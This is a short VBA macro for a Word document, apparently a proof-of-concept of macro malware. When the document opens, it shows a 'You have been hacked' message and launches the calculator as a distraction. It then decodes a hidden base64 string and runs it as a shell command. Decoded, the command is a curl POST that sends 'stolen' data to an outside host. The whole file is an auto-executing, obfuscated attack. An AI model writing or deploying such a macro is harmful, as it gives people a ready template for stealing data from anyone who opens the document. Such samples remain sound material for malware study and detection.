Private Sub Document_Open()

' Distraction
MsgBox ("You have been hacked, enjoy your calculator!")
Shell ("calc.exe")

Dim DecodedCode
DecodedCode = DecodeBase64("Y3VybCAtWCBQT1NUIC1IICJDb250ZW50LVR5cGU6IHRleHQvcGxhaW4iIC0tZGF0YSAiVGhpcyBpcyBzZW5zaXRpdmUgZGF0YSB0aGF0IGhhcyBiZWVuIHN0b2xlbiBmcm9tIHlvdS4iIGh0dHBzOi8vNDIwNjkxMzM3Lnh5ei8=")

Shell (DecodedCode)

End Sub

Function DecodeBase64(b64$)
    Dim b
    With CreateObject("Microsoft.XMLDOM").createElement("b64")
        .DataType = "bin.base64": .Text = b64
        b = .nodeTypedValue
        With CreateObject("ADODB.Stream")
            .Open: .Type = 1: .Write b: .Position = 0: .Type = 2: .Charset = "utf-8"
            DecodeBase64 = .ReadText
            .Close
        End With
    End With
End Function
